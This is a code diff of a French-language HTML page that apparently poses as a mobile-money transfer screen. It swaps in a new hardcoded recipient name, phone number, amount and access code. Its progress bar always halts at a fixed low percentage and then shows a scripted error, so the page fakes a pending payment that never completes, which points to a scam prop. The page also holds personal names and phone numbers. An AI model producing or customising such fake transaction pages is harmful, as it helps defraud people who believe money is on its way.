@@ -138,17 +138,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Daniel Junior" disabled>
+                <input type="text" id="name" value="Nkongolo Veronique Mangabu" disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro Mobile</label>
-                <input type="tel" id="phone" value="0811351302" disabled>
+                    <input type="tel" id="phone" value="62515579988" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="5 049 $" disabled>
+                <input type="text" id="amount" class="amount" value="2 100 $" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -160,7 +160,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Morcelement non terminé.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Erreur inattendue.</div>
         </form>
     </div>
 
@@ -169,7 +169,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "1302") {
+            if (accessCode === "3378") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
@@ -188,12 +188,12 @@
             const progressPercentage = document.getElementById('progressPercentage');
             
             const interval = setInterval(() => {
-                if (progress < 2) {
-                    progress += 0.25;
+                if (progress < 10) {
+                    progress += 1;
                     progressBar.style.width = progress.toFixed(2) + '%';
                     progressPercentage.textContent = progress.toFixed(2) + '%';
                 } else {
-                    progress = 2;
+                    progress = 10;
                     progressBar.style.width = progress.toFixed(2) + '%';
                     progressPercentage.textContent = progress.toFixed(2) + '%';
                     clearInterval(interval);
@@ -201,7 +201,7 @@
                     // Afficher le message d'erreur
                     document.getElementById('notificationMessage').style.display = 'block';
                 }
-            }, 100);
+            }, 98);
         }
     </script>
 </body>
